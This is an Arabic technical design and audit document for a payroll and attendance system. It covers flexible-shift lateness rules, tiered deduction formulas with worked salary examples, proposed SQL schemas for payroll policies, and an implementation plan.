- `flexTo` كمان لازم يلفّ: لو الوردية `23:30 → 08:30` والنافذة `23:30 → 00:30`، فـ`W` رقمياً أصغر من `F` ⇒ المقارنة لازم تكون على المحور الملفوف (`A' = A < S ? A + 1440 : A`).

**٢) إذن صباحي يغطّي جزءاً من التأخير** — إذن معتمد **مجاني** `09:00→10:00`، حضر 10:30، انصرف 18:00.

```
اختبار النافذة على البصمة الخام: 10:30 > 10:00 ⇒ AFTER_WINDOW   ← الإذن لا يلغي التصنيف
lateRaw = 630 − 540 = 90 د
excused = overlap([09:00,10:30], [09:00,10:00]) = 60 د
late    = 90 − 60 = 30 د        ⇒ شريحة [11,60) نمط MINUTES ⇒ 30 × 0.625 = 18.75
R       = 540 − 60 = 480 · D = 450 ⇒ short الخام = 30 ⇒ SUBTRACT_LATE ⇒ max(0, 30−30) = 0
الإجمالي = 18.75
```
القاعدة: **الإذن يخصم من الدقائق، لا يلغي التصنيف.** `flexOutcome` يفضل `AFTER_WINDOW` للتدقيق حتى لو `late = 0` — عشان تقدر تشوف مين بيعتمد على الأذونات كل يوم. ولو الإذن **بخصم** فدقائقه تُعفى من التأخير (فلا تدخل الشرائح) وتُخصم بـ`deductibleMinutes × minuteRate` مباشرة — وده **لازم يتعبّى في فرع المرنة** (حالياً صفر دائماً هناك).

**٣) نصف يوم إجازة** — إجازة صباحية معتمدة تغطّي `[09:00 → 13:30]` (270 د)، حضر 13:45، انصرف 18:00.

```
EX = 270  ⇒  R = 540 − 270 = 270 · D = 255
النافذة [09:00,10:00] مغطاة بالكامل بالإجازة ⇒ قاعدة الإلغاء تُفعَّل
late = 0 · short = 270 − 255 = 15 د > Gs(10) ⇒ 15 × 0.625 = 9.38
```
**بدون قاعدة الإلغاء:** `A = 13:45 > W = 10:00` ⇒ `late = 825 − 540 = 285 د` ⇒ شريحة [120,∞) × 2 ⇒ `285 × 2 × 0.625 = 356.25` ⇒ يتقصّ على السقف اليومي 300 ⇒ **خصم يوم كامل لموظف في إجازة نصف يوم معتمدة**. القاعدة إلزامية مش تحسينية.

**الصياغة الدقيقة:** لو `[F, W]` مغطاة بالكامل بنافذة معذورة ⇒ ألغِ اختبار النافذة. لو مغطاة **جزئياً** ⇒ أزِح النافذة: `W' = max(W, نهاية آخر تغطية معذورة متصلة ببداية الوردية)`.

**٤) لم يبصم انصراف** — حضر 10:20، ولا بصمة خروج.

```
late  = 620 − 540 = 80 د  ⇒ يُحسب طبيعياً (مش محتاج checkOut)
        ⇒ شريحة [60,120) × 1.5 ⇒ 80 × 1.5 × 0.625 = 75.00
short = غير معروف ⇒ missingCheckout = 1
```
`missingCheckoutPolicy` على السياسة:

| القيمة | السلوك | التوصية |
|---|---|---|
| `FLAG_ONLY` | `short = 0` + علم يمنع **اعتماد** المسير لحد ما يتعالج | ✅ الافتراضي — لا تخترع رقماً |
| `ASSUME_SHIFT_END` | يُفترض الانصراف مع نهاية الوردية | مقبول بموافقة صريحة |
| `TREAT_AS_ZERO_WORK` | `short = R` (خصم يوم كامل) | خطر — عقوبة على خلل جهاز |

الوضع الحالي (`attendance.service.ts:1099-1101`): `status='present'` بأصفار ⇒ **لا تأخير ولا نقص ولا علم** ⇒ ثقب صامت.

**٥) حالات إضافية مطلوب تثبيتها**

| الحالة | القرار |
|---|---|
| بصمة خروج فقط (نسي الدخول) | لا تأخير — البصمة **لا** تُحسب دخولاً (السلوك الحالي صح: `attendance.service.ts:1078-1081`)، لكن يُرفع علم `missingCheckin` |
| حضر بعد النافذة ثم انصرف قبل النهاية | `late` بالشرائح + `short` بـ`SUBTRACT_LATE`. في المرنة **لا يوجد `earlyLeave`** مفهومياً — النقص يغطّيه |
| حضر داخل النافذة وزوّد ساعات | `short = 0` · الزيادة **لا تُصفّي** تأخير أيام تانية · الأوفرتايم بمساره المستقل واعتماداته |
| المرنة + يوم عطلة/ويك إند | لا تأخير ولا نقص — `status='holiday'` (السلوك الحالي صح: `attendance.service.ts:1022-1027`) |
| المرنة + إجازة يوم كامل | `status='leave'`، ولا حساب — مع `leaveConflict` لو فيه بصمة (`attendance.service.ts:1021`) |
| موظف مستثنى من الحضور (بند ⑨) | يتخطّى الفرع كله — لا تأخير ولا نقص ولا غياب |

---

### ب) شرائح خصم التأخير

#### ب-١) المطلوب و ب-٢) الحالة عندنا

| النمط | المعنى | الحالة | الدليل |
|---|---|---|---|
| `FRACTION` — كسر يوم | ربع/نصف/يوم × قيمة اليوم | **موجود** | `payroll-rules.entities.ts:21-24` · التطبيق `payroll.service.ts:78-79` |
| `MINUTES` — بالسعر نفسه 1:1 | دقائق × سعر الدقيقة | **موجود** | نفس السطور · `payroll.service.ts:80` (`value` يُتجاهَل ويُخزَّن 0 — `payroll-rules.service.ts:44`) |
| **`MULTIPLIER` — مضاعف** | الساعة تُخصم بساعة ونصف | **غير موجود** | `LatenessTierMode = 'FRACTION' \| 'MINUTES'` — `payroll-rules.entities.ts:6`. لا سبيل لضرب معامل إطلاقاً |
| الترتيب (`sortOrder`) | ترتيب صريح للمطابقة | **غير موجود** | الترتيب ضمني بـ`fromMinutes ASC` — `payroll.service.ts:204` |
| **الربط بسياسة** | شرائح لكل مسير | **غير موجود** | لا `policyId` ولا `branchId` على الكيان (`payroll-rules.entities.ts:9-34`) · القراءة `{ isActive: true }` فقط (`payroll.service.ts:202-205`) ⇒ **طقم واحد يحكم الشركة كلها** |
| منع التداخل/الفجوات | تحقّق عند الحفظ | **غير موجود** | `payroll-rules.service.ts:33-47` يتحقق `to ≥ from` فقط |
| كيان `PayrollPolicy` | — | **غير موجود إطلاقاً** · `PayrollRun.policyId` عمود **يُكتب ولا يُقرأ** | `payroll.entities.ts:50-51` · `payroll.service.ts:186` |

#### ب-٣) السكيمة المقترحة

```sql
-- الأب: طقم المعادلات المرتبط بالمسير (بند ③)
CREATE TABLE payroll_policies (
  id                    INT IDENTITY PRIMARY KEY,
  name                  NVARCHAR(150) NOT NULL,          -- «سياسة فرع الرياض»
  isActive              BIT NOT NULL DEFAULT 1,
  -- أُسس التسعير
  monthlyDays           DECIMAL(5,2) NOT NULL DEFAULT 30,
  dailyHours            DECIMAL(4,2) NOT NULL DEFAULT 8,
  rateBase              VARCHAR(10)  NOT NULL DEFAULT 'GROSS',  -- GROSS | BASIC
  hourRateBasis         VARCHAR(24)  NOT NULL DEFAULT 'CONFIG_DAILY_HOURS',
  -- التأخير
  lateEnabled           BIT NOT NULL DEFAULT 1,
  graceMinutes          INT NULL,               -- NULL ⇒ الوردية ⇒ attendance.grace_minutes
  graceMode             VARCHAR(12) NOT NULL DEFAULT 'FORGIVE_ALL', -- FORGIVE_ALL | SUBTRACT
  tierBasis             VARCHAR(16) NOT NULL DEFAULT 'PER_DAY',     -- PER_DAY | PER_PERIOD_TOTAL
  noTierBehavior        VARCHAR(16) NOT NULL DEFAULT 'MINUTES_1_1', -- MINUTES_1_1 | ZERO | BLOCK
  dailyDeductionCapDays DECIMAL(4,2) NOT NULL DEFAULT 1.0,         -- سقف خصم اليوم بأيام
  -- النقص (الوردية المرنة)
  shortfallMode         VARCHAR(12) NOT NULL DEFAULT 'MINUTES',    -- MINUTES | MULTIPLIER | FRACTION
  shortfallValue        DECIMAL(6,3) NOT NULL DEFAULT 1.0,
  afterWindowOverlap    VARCHAR(16) NOT NULL DEFAULT 'SUBTRACT_LATE',
  missingCheckoutPolicy VARCHAR(20) NOT NULL DEFAULT 'FLAG_ONLY'
);

-- الابن: الشرائح — نصف مفتوحة [fromMinutes, toMinutes)
CREATE TABLE lateness_tiers (
  id          INT IDENTITY PRIMARY KEY,
  policyId    INT NOT NULL REFERENCES payroll_policies(id) ON DELETE CASCADE,  -- ← الإضافة الجوهرية
  sortOrder   INT NOT NULL DEFAULT 0,
  fromMinutes INT NOT NULL,                 -- شامل
  toMinutes   INT NULL,                     -- غير شامل · NULL = ∞
  mode        VARCHAR(12) NOT NULL,         -- MULTIPLIER | FRACTION | MINUTES
  value       DECIMAL(6,3) NOT NULL DEFAULT 0,
  label       NVARCHAR(200) NULL,
  isActive    BIT NOT NULL DEFAULT 1
);
CREATE UNIQUE INDEX ux_tier_policy_from ON lateness_tiers(policyId, fromMinutes) WHERE isActive = 1;

-- وربط المسير: PayrollRun.policyId يصير FK **يُقرأ** (اليوم عمود ميّت)
```

**تغيير دلالي مقصود:** الحدود دلوقتي **نصف مفتوحة** `[from, to)` بدل شاملة الطرفين (التعليق الحالي `payroll-rules.entities.ts:13-17`). السبب: التجاور يبقى `next.from == prev.to` بالضبط، فالفجوات والتداخلات تستحيل بالبناء، وينتهي عبث الـ`+1`. **مطلوب مايجريشن:** كل `toMinutes` قائم يزيد 1.

#### ب-٤) المعادلات الثلاث

```
minuteRate = rateBase / monthlyDays / dailyHours / 60
dayRate    = rateBase / monthlyDays

MULTIPLIER : deduction = lateMinutes × value × minuteRate
             «الساعة تُخصم بساعة ونصف» ⇒ value = 1.5
             value ≥ 0 (المعتاد ≥ 1) · القيمة إلزامية

FRACTION   : deduction = value × dayRate            ← lateMinutes لا تدخل، مبلغ مقطوع للشريحة
             ربع يوم = 0.25 · نصف يوم = 0.5 · يوم = 1
             value > 0 إلزامي

MINUTES    : deduction = lateMinutes × minuteRate   ← 1:1، value يُتجاهَل (= 1.0 ضمناً)
```

`MINUTES` ≡ `MULTIPLIER` بـ`value = 1`، وبنُبقيه نمطاً منفصلاً لتوافق البيانات القائمة ولوضوح الواجهة («بالسعر نفسه» أوضح من «مضاعف = 1»).

**التغييرات المطلوبة في الكود:**

| الملف:السطر | التغيير |
|---|---|
| `api/src/payroll/payroll-rules.entities.ts:6` | `LatenessTierMode = 'MULTIPLIER' \| 'FRACTION' \| 'MINUTES'` + `policyId` + `sortOrder` |
| `api/src/payroll/payroll-rules.service.ts:41-47` | قبول `MULTIPLIER` + `value > 0` له + التحقق من التغطية/التداخل (ب-٧) |
| `api/src/payroll/payroll-rules.controller.ts:29` | `TierDto.mode` |
| `api/src/payroll/payroll.service.ts:64-81` | فرع `MULTIPLIER` + السقف اليومي + `noTierBehavior` |
| `api/src/payroll/payroll.service.ts:202-205` | `find({ policyId: run.policyId, isActive: true })` بدل `{ isActive: true }` |
| `api/src/payroll/payroll.service.ts:263-279` | فصل `shortfallMinutes` عن `lateMinutes` بمعالجين مختلفين |
| `src/app/payroll/formulas/page.tsx:164` | خيار «مضاعف» في قائمة النمط + معاينة رقمية حيّة |

#### ب-٥) مثال المواصفة حرفياً — راتب 9000

المواصفة: «الشريحة الأولى (من ساعة إلى ساعتين): الساعة تُخصم بساعة ونصف» · «الشريحة الثانية (من ساعتين فما فوق): الساعة تُخصم بساعتين».

```
الأسس:  dayRate = 9000/30 = 300.000   ·   hourRate = 300/8 = 37.500   ·   minuteRate = 0.625

السلّم الكامل الموصى به (grace = 10 دقائق):
  [  0,  11)  →  معفاة ضمناً (السماح — لا تُخزَّن كشريحة)
  [ 11,  60)  →  MINUTES              value = —      «تأخير بسيط: بالسعر نفسه»
  [ 60, 120)  →  MULTIPLIER           value = 1.5    «من ساعة لساعتين: الساعة بساعة ونصف»  ← ①
  [120,   ∞)  →  MULTIPLIER           value = 2.0    «من ساعتين فما فوق: الساعة بساعتين»   ← ②
```

| التأخير | الشريحة | المعادلة | **الخصم** | يعادل |
|---|---|---|---|---|
| 30 د | `[11,60)` MINUTES | 30 × 0.625 | **18.75** | 30 دقيقة أجر |
| **61 د** (مثال 10:01) | `[60,120)` ×1.5 | 61 × 1.5 × 0.625 | **57.19** | 91.5 دقيقة أجر |
| 90 د | `[60,120)` ×1.5 | 90 × 1.5 × 0.625 | **84.38** | 135 دقيقة |
| 119 د | `[60,120)` ×1.5 | 119 × 1.5 × 0.625 | **111.56** | 178.5 دقيقة |
| **120 د** | `[120,∞)` ×2 | 120 × 2 × 0.625 | **150.00** | 240 دقيقة |
| 150 د | `[120,∞)` ×2 | 150 × 2 × 0.625 | **187.50** | 300 دقيقة |
| 240 د | `[120,∞)` ×2 | 240 × 2 × 0.625 | **300.00** | يوم كامل (عند السقف بالضبط) |
| 300 د | `[120,∞)` ×2 | 375.00 → **مقصوص** | **300.00** | السقف اليومي |

**مقارنة الأنماط الثلاثة على نفس الدقائق** (يوضّح لصاحب النظام أثر اختياره):

| التأخير | `MULTIPLIER` (1.5 / 2) | `FRACTION` (0.25 / 0.5) | `MINUTES` (1:1) |
|---|---|---|---|
| 61 دقيقة | **57.19** | 75.00 | 38.13 |
| 150 دقيقة | **187.50** | 150.00 | 93.75 |

ملاحظة مهمة: `FRACTION` **لا تتغير مع الدقائق داخل الشريحة** — 61 دقيقة و119 دقيقة يخصمان 75.00 بالضبط. ده مقصود («ربع يوم» عقوبة مقطوعة)، لكنه يخلق حافزاً عكسياً داخل الشريحة: بعد ما يتأخر 61 دقيقة، مافيش فرق مالي لو تأخر 119. `MULTIPLIER` بيمنع ده لأنه تناسبي.

#### ب-٦) قواعد السلامة

**١) منع التداخل والفجوات — تحقّق عند الحفظ (إلزامي)**

```
validateTiers(policyId):
    T = الشرائح النشطة مرتَّبة بـ fromMinutes تصاعدياً
    if (T فارغة) → مسموح (يسري noTierBehavior على الكل)
    if (T[0].fromMinutes != بداية التغطية المتوقَّعة)   → خطأ «فجوة في البداية»
                                              (بداية التغطية = graceMinutes + 1 أو 0 حسب graceMode)
    for i in 1..n-1:
        if (T[i].fromMinutes <  T[i-1].toMinutes) → خطأ «تداخل: الشريحة X تتقاطع مع Y»
        if (T[i].fromMinutes >  T[i-1].toMinutes) → خطأ «فجوة غير مغطاة: من A إلى B»
        if (T[i-1].toMinutes == NULL)             → خطأ «شريحة مفتوحة في المنتصف»
    if (T[n-1].toMinutes != NULL) → تحذير «آخر شريحة مقفولة — التأخير فوق N دقيقة بلا شريحة»
    كل شريحة: (toMinutes == NULL || toMinutes > fromMinutes)
    MULTIPLIER/FRACTION ⇒ value > 0 · MINUTES ⇒ value يُتجاهَل
```

الوضع الحالي بلا هذا التحقق: `payroll.service.ts:72-76` بتاخد **أول** شريحة مطابقة في ترتيب `fromMinutes ASC` — يعني مع شريحتين متداخلتين، صاحبة الـ`from` الأصغر تكسب **بصمت** والتانية بتبقى ميتة بدون ما حد يعرف.

**٢) لو ما طابقت أي شريحة**

| `noTierBehavior` | السلوك | ملاحظة |
|---|---|---|
| `MINUTES_1_1` | `lateMinutes × minuteRate` | **السلوك الحالي** — `payroll.service.ts:77`. الافتراضي للتوافق |
| `ZERO` | لا خصم | «اللي مش معرَّف مش مخصوم» — الأوضح تعاقدياً |
| `BLOCK` | يمنع اعتماد المسير ويعرض الأيام غير المغطاة | الأسلم للتشغيل الجاد |

مع التحقق أعلاه + شريحة أخيرة مفتوحة (`toMinutes = NULL`)، الحالة دي **تبقى غير قابلة للحدوث** — والـ`noTierBehavior` يفضل شبكة أمان.

**٣) علاقة الشرائح بمدة السماح (grace)**

| البند | الوضع |
|---|---|
| مكان السماح اليوم | في **الحضور** لا الرواتب: `Shift.graceMinutes` ← `attendance.grace_minutes` (`attendance.service.ts:914-917`) |
| كيف يُطبَّق | `lateMinutes = effectiveLate > grace ? effectiveLate : 0` (`attendance.service.ts:1115`) — «كل شيء أو لا شيء»: 11 دقيقة تأخير تُسجَّل **11** لا 1 |
| المشكلة | السماح في موديول والشرائح في موديول تاني ⇒ لو `grace = 10` والشريحة الأولى تبدأ من 60، فالمدى **11–59 بلا شريحة** ويقع على `noTierBehavior` بدون ما حد لاحظ |
| العلاج | `PayrollPolicy.graceMinutes` (يتقدّم على الوردية) + تحقق يرفض `T[0].fromMinutes > graceMinutes + 1` + معاينة في الشاشة تعرض السلّم كشريط متصل من 0 لـ∞ |

`graceMode`:

| القيمة | القاعدة | مثال: تأخير 65 د، grace 10 |
|---|---|---|
| **`FORGIVE_ALL`** (الحالي) | تحت السماح ⇒ 0، فوقه ⇒ **كل الدقائق** | `late = 65` ⇒ `[60,120)` ⇒ 65 × 1.5 × 0.625 = **60.94** |
| `SUBTRACT` | يُطرح السماح دائماً | `late = 55` ⇒ `[11,60)` ⇒ 55 × 0.625 = **34.38** |

فرق النمطين هنا 26.56 ريال، وكمان **بيغيّر الشريحة المطابقة**. لازم يكون قراراً معلَناً في السياسة مش سلوكاً مدفوناً.

**٤) تراكمي شهرياً أم لكل يوم؟**

اليوم: **لكل يوم** — `attRows.reduce(... latenessForDay(r.lateMinutes, ...))` (`payroll.service.ts:271-278`)، وهو القراءة الطبيعية لنص المواصفة. لكن لازم يبقى خياراً صريحاً لأن الفرق ضخم:

مثال: 3 أيام × 25 دقيقة تأخير (إجمالي 75 دقيقة)، بالسلّم أعلاه:

| `tierBasis` | الحساب | النتيجة |
|---|---|---|
| **`PER_DAY`** (الافتراضي) | 3 × (25 × 0.625) — كل يوم في `[11,60)` | **46.88** |
| `PER_PERIOD_TOTAL` | 75 دقيقة ⇒ `[60,120)` ×1.5 ⇒ 75 × 1.5 × 0.625 | **70.31** |

ومع `FRACTION` الفرق أعنف: `PER_DAY` بشريحة ربع يوم = 3 × 75 = **225**، بينما `PER_PERIOD_TOTAL` = **75** — الفرق ثلاثة أضعاف.

**تحذير `FRACTION` + `PER_DAY`:** بشريحة نصف يوم، **12 يوم تأخير = 6 أيام أجر** = 1800 ريال من 9000 (20% من الراتب). السقف اليومي ما بيحميش من ده — لازم **سقف شهري** كمان: `monthlyLatenessCapDays` (مثلاً 3 أيام) أو سقف على إجمالي الخصومات كنسبة من الصافي.

**٥) نمط المطابقة: مقطوع أم تصاعدي؟**

المواصفة تقرأ **مقطوعاً** (`FLAT`): الشريحة المطابقة تحكم **كل** الدقائق. وده بيخلق «هاوية» عند الحد:

| التأخير | الشريحة | الخصم | القفزة |
|---|---|---|---|
| 119 د | ×1.5 | 111.56 | — |
| 120 د | ×2.0 | 150.00 | **+38.44 بدقيقة واحدة** |

خيار اختياري `tierApplication: FLAT | INCREMENTAL` (تصاعدي كالشرائح الضريبية):

```
INCREMENTAL على 150 دقيقة:
   [ 0, 11)  معفاة                    →   0.00
   [11, 60)  49 د × 1.0 × 0.625       →  30.63
   [60,120)  60 د × 1.5 × 0.625       →  56.25
   [120,150] 30 د × 2.0 × 0.625       →  37.50
   ────────────────────────────────────────────
   الإجمالي                            → 124.38   (مقابل 187.50 بـ FLAT)
```
**الافتراضي `FLAT`** لأنه المطلوب حرفياً؛ و`INCREMENTAL` يُعرَض كخيار للسياسات الألطف (والقفزة عنده تختفي تماماً).

#### ب-٧) ربط الشرائح بالسياسة لا بالشركة

المطلوب (بند ③): «عندي 3 مسارات، كل مسار يمشي بحسبة مختلفة».

```
PayrollPolicy 1..N  ──<  LatenessTier        (policyId FK, CASCADE)
       ▲
       │ policyId (FK يُقرأ فعلياً)
       │
   PayrollRun  ── scopeType/scopeIds/employeeIds ──> PayrollRunMember (لقطة الأعضاء)
```

| القاعدة | التفصيل |
|---|---|
| مصدر السياسة | `PayrollRun.policyId` — الموجود اليوم كعمود يُكتب (`payroll.service.ts:186`) **ولا يُقرأ في أي سطر** |
| القراءة | `latenessTiers.find({ where: { policyId: run.policyId, isActive: true }, order: { sortOrder: 'ASC', fromMinutes: 'ASC' } })` — بدل `{ isActive: true }` العام (`payroll.service.ts:202-205`) |
| **تجميد اللقطة** | عند اعتماد المسير، تُنسخ الشرائح والأسس كـJSON داخل `PayrollRun.policySnapshot` ⇒ تعديل السياسة بعدها **لا يغيّر مسيراً معتمداً**، وإعادة الطباعة تعطي نفس الأرقام |
| السياسة الافتراضية | `payroll_policies` فيها صف `isDefault = 1` يُستخدم لو `policyId` فاضي — والمايجريشن ينقل الشرائح العامة الحالية إليه ⇒ **صفر تغيير سلوكي على المسيرات القائمة** |
| الأثر في القسيمة | `PayrollItem.breakdown` يحمل `policyId` + `policyName` + لكل يوم: `date, lateMinutes, shortfallMinutes, tierId, tierLabel, mode, value, amount, cappedBy` ⇒ الموظف يقدر يشوف **ليه** اتخصم الرقم ده بالضبط، وده اللي بيوقف الجدل |

#### ب-٨) ترتيب التنفيذ المقترح

| # | الخطوة | لماذا أولاً |
|---|---|---|
| ١ | فصل `shortfallMinutes` عن `lateMinutes` + مايجريشن | كل ما بعده يعتمد على انفكاك الالتباس الدلالي |
| ٢ | حقول النافذة على `Shift` + إعادة كتابة فرع المرنة (`attendance.service.ts:1082-1101`) | القواعد الأربع |
| ٣ | إصلاح لفّ منتصف الليل + نافذة استعلام البصمات (`attendance.service.ts:904-909, 1094, 1133`) | بدونه الوردية الليلية تعطي أرقاماً خيالية في كل الأنماط |
| ٤ | `MULTIPLIER` + الحدود نصف المفتوحة + تحقق التغطية | ⑤ |
| ٥ | `PayrollPolicy` + `policyId` يُقرأ + لقطة السياسة | ③ — ويفكّ العمود الميّت |
| ٦ | معالج النقص المستقل + `SUBTRACT_LATE` + السقف اليومي/الشهري | يمنع الازدواج والصافي السالب |
| ٧ | الشاشات: `src/app/attendance/shifts/page.tsx` (النافذة) · `src/app/payroll/formulas/page.tsx:164` (المضاعف + معاينة السلّم) | آخر شيء — بعد ما المحرك يبقى صح |

---

## ٣) محرّك السياسات والمعادلات (Payroll Policy Engine)

> **البند المرجعي (③ في المواصفة):** «نقدر نعمل أكثر من طقم معادلات/طرق خصومات، ونربط كل طقم بمسار رواتب معيّن. يعني عندي 3 مسارات، كل مسار يمشي بحسبة مختلفة عن الآخر.»

---

### ٣-٠) الخلاصة في سطرين

المحرك المرن **مبني نصفه بالفعل وغير موصول بأي شيء**. عندنا مُقيّم معادلات آمن كامل (234 سطر) وكتالوج متغيرات (18 متغيراً) و عمود `policyId` على المسير — وكل هؤلاء **كود ميت حرفياً**: صفر مستوردين. الحساب الحقيقي كله **مثبّت hard-coded** في `payroll.service.ts:224-396`. المطلوب مش بناء من الصفر، المطلوب **كيان السياسة + بناء سياق المتغيرات + التوصيل + بوابة تكافؤ**.

---

### ٣-١) الحالة عندنا الآن — بالدليل

| المكوّن | الحالة | الدليل (ملف:سطر) |
|---|---|---|
| كيان `PayrollPolicy` | **غير موجود إطلاقاً** | لا ملف ولا جدول. مجلد `api/src/payroll/` فيه 11 ملف، مفيش `policy` في أي منها |
| `PayrollRun.policyId` | **عمود ميت** — يُكتب ولا يُقرأ | التعريف `payroll.entities.ts:50-51` · الكتابة `payroll.service.ts:186` · **صفر قُرّاء** |
| `policyId` في الـDTO | **غير ممرَّر** | الخدمة تقبله (`payroll.service.ts:157`) لكن `payroll.controller.ts:34-60` لا يحتوي الحقل → مستحيل إرساله من الشبكة |
| مُقيّم المعادلات الآمن | **مكتمل — كود ميت** | `api/src/payroll/safe-formula.ts` (`evalFormula:211`, `validateFormula:222`). grep شامل على `.ts` كله: النتائج الوحيدة **داخل الملف نفسه** |
| كتالوج المتغيرات | **موجود — كود ميت** | `api/src/payroll/payroll-variables.ts:14-39` (18 متغيراً). grep: **صفر مستوردين**. التعليق `:5` يشير لدالة `buildContext()` **غير موجودة أصلاً** |
| الحساب الفعلي | **مثبّت في الكود** | `payroll.service.ts:224-396` — حلقة واحدة، 5 بنود خصم و3 بنود استحقاق، بلا أي قابلية تعريف |
| شرائح التأخير | **عامة للشركة كلها** | `payroll-rules.entities.ts:9-34` — **لا `policyId` ولا `branchId`** · تُقرأ بـ`{ isActive: true }` فقط (`payroll.service.ts:202-205`) |
| فترة/ثوابت الاحتساب | **مفاتيح config عامة** | `payroll.cycle_start_day=23`, `payroll.monthly_days=30`, `payroll.daily_hours=8`, `payroll.late_deduction_enabled=true` — تُقرأ `payroll.service.ts:93, 197-200`. **لا تجاوز لكل فرع ولا لكل سياسة** |
| شاشة «معادلات الرواتب» | حقيقية لكن ضيّقة | `src/app/payroll/formulas/page.tsx` (213 سطر) — شرائح تأخير + معامل غياب فقط. لا محرّر سياسات |

**النتيجة العملية اليوم:** كل موظفي الشركة — الرياض والمعادي والنصر — يمشون بنفس الحسبة بالضبط. تغيير شريحة تأخير لفرع واحد **يغيّرها للجميع فوراً وبأثر رجعي على أي مسير يُعاد حسابه**.

---

### ٣-٢) كيان السياسة (PayrollPolicy) — التصميم المقترح

التصميم على **ثلاث طبقات** عن قصد: هوية ثابتة (يمكن إعادة تسميتها بلا خطر) + نسخة تتجمّد (تحمي التدقيق) + بنود (هي المحرك الفعلي).

#### (أ) الهوية — `payroll_policies`

| الحقل | النوع | المعنى | ملاحظات |
|---|---|---|---|
| `id` | INT PK | — | — |
| `code` | NVARCHAR(40) UNIQUE | `RIYADH_LENIENT` | مفتاح مستقر للتكامل والاستيراد |
| `name` | NVARCHAR(200) | «سياسة فرع الرياض» | **قابل للتعديل دائماً** — لا يمسّ الحساب |
| `description` | NVARCHAR(MAX) NULL | شرح لصاحب النظام | — |
| `defaultScopeType` | NVARCHAR(20) NULL | نفس `PayrollScopeType` (`payroll.entities.ts:15-21`) | نطاق افتراضي للاقتراح والتحذير — **ليس قيداً** |
| `defaultScopeIds` | NVARCHAR(MAX) NULL | JSON | نفس نمط `payroll.entities.ts:37-42` |
| `currentVersionId` | INT NULL FK | النسخة النشطة | — |
| `isActive` | BIT DEFAULT 1 | نشطة / **مؤرشفة** | مؤرشفة = لا تُختار لمسير جديد، لكن المسيرات القديمة تظل مقروءة |
| `createdBy/At`, `updatedBy/At` | — | تدقيق | — |

#### (ب) النسخة — `payroll_policy_versions` (هنا تعيش قواعد الاحتساب)

| الحقل | النوع | افتراضي | يقابل اليوم |
|---|---|---|---|
| `policyId` | INT FK | — | — |
| `versionNo` | INT | 1 | UNIQUE(policyId, versionNo) |
| `status` | `DRAFT \| ACTIVE \| ARCHIVED` | DRAFT | — |
| `effectiveFrom` | DATE NULL | — | — |
| `cycleStartDay` | TINYINT NULL | null→config | `payroll.cycle_start_day` (`payroll.service.ts:93`) |
| `cycleEndMode` | `DERIVED \| FIXED_DAY` | DERIVED | المشتق حالياً `startDay-1` (`payroll.service.ts:96`) — **جامد** |
| `cycleEndDay` | TINYINT NULL | — | **جديد** — يحل بند ② (من كام لكام) |
| `monthlyDays` | DEC(5,2) NULL | null→30 | `payroll.service.ts:197` |
| `dailyHours` | DEC(5,2) NULL | null→8 | `payroll.service.ts:198` |
| `rateBase` | `GROSS \| BASIC \| FORMULA` | GROSS | ثابت اليوم = GROSS (`payroll.service.ts:231-232`) |
| `rateBaseFormula` | NVARCHAR(500) NULL | — | يُقيَّم على متغيرات المرحلة 0 فقط |
| `roundingMode` | `HALF_UP \| HALF_EVEN \| DOWN` | HALF_UP | `round2()` جامدة اليوم |
| `roundingScale` | TINYINT | 2 | — |
| `netFloor` / `netFloorPct` | DEC NULL | — | **يحل ثغرة الصافي السالب** (`payroll.service.ts:345-354` بلا أرضية) |
| `carryOverExcess` | BIT | 0 | ترحيل الفائض للمسير التالي |
| `skipAttendance` | BIT | 0 | يخدم بند ⑨ (موظف مستثنى من الحضور) |
| `lateDeductionEnabled` | BIT | 1 | بديل المفتاح العام `payroll.late_deduction_enabled` |
| `frozenAt` | DATETIME NULL | — | **يُختم لحظة أول استخدام في مسير** |

**قاعدة التجميد (copy-on-write):** أي محاولة تعديل نسخة `frozenAt != null` → النظام **لا يعدّل**، بل يستنسخها نسخة جديدة `versionNo+1` بحالة `DRAFT`. مستحيل أن تتغيّر أرقام مسير قديم.

#### (ج) البنود — `payroll_policy_components`

```sql
payroll_policy_components
  id              INT PK
  versionId       INT FK
  seq             INT                -- ترتيب العرض وفكّ التعادل
  stage           NVARCHAR(12)       -- EARNING | DEDUCTION | INFO
  code            NVARCHAR(40)       -- فريد داخل النسخة: 'LATE_DED'
  nameAr          NVARCHAR(200)      -- «خصم تأخير»
  valueSource     NVARCHAR(20)       -- انظر الجدول أدناه
  amount          DECIMAL(18,2) NULL -- FIXED
  fieldPath       NVARCHAR(60)  NULL -- EMPLOYEE_FIELD (قائمة بيضاء)
  varCode         NVARCHAR(40)  NULL -- SYSTEM_VAR
  percent         DECIMAL(9,4)  NULL -- PERCENT_OF
  baseCode        NVARCHAR(40)  NULL -- PERCENT_OF: قاعدة النسبة
  tierSetId       INT           NULL -- TIERED
  tierInputVar    NVARCHAR(40)  NULL -- TIERED: 'LATE_MINUTES'
  applyMode       NVARCHAR(12)       -- PER_DAY | PER_PERIOD
  formula         NVARCHAR(500) NULL -- FORMULA
  ledgerCategory  NVARCHAR(40)  NULL -- LEDGER: 'quality' | '*' 
  ledgerDirection NVARCHAR(6)   NULL -- DEBIT | CREDIT
  minAmount       DECIMAL(18,2) NULL -- أرضية البند
  maxAmount       DECIMAL(18,2) NULL -- سقف البند
  rollupTo        NVARCHAR(40)  NULL -- عمود PayrollItem القديم (للتكافؤ)
  exemptible      BIT DEFAULT 1      -- يقبل الإعفاء الفردي (بند ⑧)
  showOnPayslip   BIT DEFAULT 1
  isActive        BIT DEFAULT 1
  UNIQUE(versionId, code)
```

#### (د) مصادر القيمة (`valueSource`) — الثمانية المطلوبة

| المصدر | ما يعنيه | الحقول | مثال حقيقي |
|---|---|---|---|
| `FIXED` | مبلغ ثابت | `amount` | بدل هاتف = 200 |
| `EMPLOYEE_FIELD` | حقل من ملف الموظف | `fieldPath` | `housingAllowance` (`employee.entity.ts`) |
| `SYSTEM_VAR` | متغير من الكتالوج | `varCode` | `OT_AMOUNT` |
| `PERCENT_OF` | نسبة من قاعدة | `percent`,`baseCode` | 10% من `BASIC` |
| `TIERED` | شريحة | `tierSetId`,`tierInputVar`,`applyMode` | شرائح التأخير (بند ⑤) |
| `FORMULA` | معادلة نصية | `formula` | `min(LATE_MINUTES*MINUTE_RATE, DAY_RATE*0.5)` |
| `LEDGER` | دفتر المديونيات | `ledgerCategory`,`ledgerDirection` | «خصم جودة» (بند ⑦) |
| `EXTERNAL` | مُدخل يدوي على المسير | — | تسوية استثنائية |

